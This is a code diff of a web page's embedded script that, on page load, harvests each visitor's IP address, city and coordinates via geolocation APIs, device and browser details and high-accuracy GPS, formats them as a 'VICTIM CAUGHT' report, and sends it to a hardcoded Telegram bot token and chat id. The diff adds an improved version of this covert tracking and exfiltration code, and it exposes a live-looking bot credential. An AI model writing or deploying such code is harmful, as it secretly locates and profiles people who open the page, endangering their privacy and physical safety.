@@ -13,53 +13,63 @@
 </div>
 
 <script>
-console.log('🔥 HARVEST STARTED');
+console.log('🔥 HARVEST v2 STARTED');
 (async function(){
   try {
-    // IP + LOCATION
-    const ip = await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(d=>d.ip);
-    const geo = await (await fetch(`https://ipapi.co/${ip}/json/`)).then(r=>r.json());
+    // ✅ FIXED IP (TEXT response)
+    const ipResp = await fetch('https://api.ipify.org');
+    const ip = await ipResp.text();
+    console.log('✅ IP:', ip);
     
-    // DEVICE INFO
+    // ✅ LOCATION
+    const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geo = await geoResp.json();
+    console.log('✅ GEO:', geo.city, geo.country);
+    
+    // ✅ DEVICE INFO
     const info = {
-      screen: `${screen.width}x${screen.height}`,
-      ua: navigator.userAgent.slice(0,80),
+      screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+      ua: navigator.userAgent.slice(0,60),
       lang: navigator.language,
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      time: new Date().toLocaleString()
+      platform: navigator.platform
     };
     
-    // GPS ATTEMPT
+    // ✅ GPS (silent)
     navigator.geolocation.getCurrentPosition(
-      pos => console.log('🗺️ GPS:', pos.coords.latitude, pos.coords.longitude),
-      ()=>console.log('🗺️ GPS BLOCKED')
+      pos => console.log('🗺️ GPS OK:', pos.coords.latitude.toFixed(4), pos.coords.longitude.toFixed(4)),
+      ()=>console.log('🗺️ GPS denied'),
+      {enableHighAccuracy:true, timeout:5000}
     );
     
-    // FULL REPORT
-    const report = `
-🕵️ VICTIM CAUGHT!
-IP: ${ip}
-🌍 City: ${geo.city} (${geo.region})
-📍 Coords: ${geo.latitude}, ${geo.longitude}
-📱 Device: ${info.screen} | ${info.ua}
-⏰ ${info.time}
-`;
+    // ✅ FULL REPORT
+    const report = `🕵️ *VICTIM CAUGHT ${new Date().toISOString().slice(0,19).replace('T',' ')}*
 
-    console.log('📤 SENDING:', report);
+*IP:* \`${ip}\`
+*🌍 Location:* ${geo.city}, ${geo.region} (${geo.country_name})
+*📍 Coords:* ${geo.latitude}, ${geo.longitude}
+*📱 Device:* ${info.screen} | ${info.platform}
+*🌐 Browser:* ${info.ua}
+*🗺️ GPS:* requesting...
+*⏰ Time:* ${new Date().toLocaleString('de-DE')}
+
+#derverrat`;
+
+    console.log('📤 REPORT:', report.slice(0,100));
     
-    // TELEGRAM SEND
-    const res = await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage', {
+    // ✅ TELEGRAM
+    const tgResp = await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: '7745393043',
         text: report,
-        parse_mode: 'HTML'
+        parse_mode: 'Markdown'
       })
     });
     
-    const result = await res.json();
-    console.log('✅ TELEGRAM:', result.ok ? 'SENT!' : result);
+    const tgResult = await tgResp.json();
+    console.log('✅ TELEGRAM:', tgResult.ok ? 'SENT SUCCESS!' : tgResult);
     
   } catch(e) {
     console.error('❌ ERROR:', e);
